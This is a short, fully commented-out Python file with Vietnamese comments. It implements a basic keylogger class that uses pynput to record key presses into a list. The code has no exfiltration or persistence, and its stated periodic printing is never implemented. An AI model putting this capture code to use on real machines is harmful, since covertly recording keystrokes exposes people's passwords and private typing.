# import threading
# from pynput import keyboard

# class Keylogger:
#     def __init__(self, interval):
#         self.interval = interval
#         self.log = [] # Dùng List để append  O(1)

#     def _format_key(self, key):
#         """Dịch phím bấm sang định dạng mong muốn."""
#         try:
#             # Xử lý phím chữ/số bình thường
#             if key.char is not None:
#                 return str(key.char)
#             return "" 
#         except AttributeError:
#             # Xử lý phím đặc biệt
#             if key == keyboard.Key.space:
#                 return " "
#             elif key == keyboard.Key.enter:
#                 return "\n"
#             elif key == keyboard.Key.tab:
#                 return "\t"
#             elif key == keyboard.Key.backspace or key == keyboard.Key.esc:
#                 return " "
#             else:
#                 # Các phím khác bọc trong ngoặc để dễ phân biệt
#                 return f" [{str(key).replace('Key.', '')}] "

#     def process_key_press(self, key):
    
#         content = self._format_key(key)
#         if content: # Chỉ thêm nếu content không phải chuỗi rỗng
#                 self.log.append(content)

        

#     def start(self):
#         with keyboard.Listener(on_press=self.process_key_press) as listener:
#             listener.join()

# # Chạy thử
# if __name__ == "__main__":
#     logger = Keylogger(5) # In ra sau mỗi 5 giây
#     logger.start()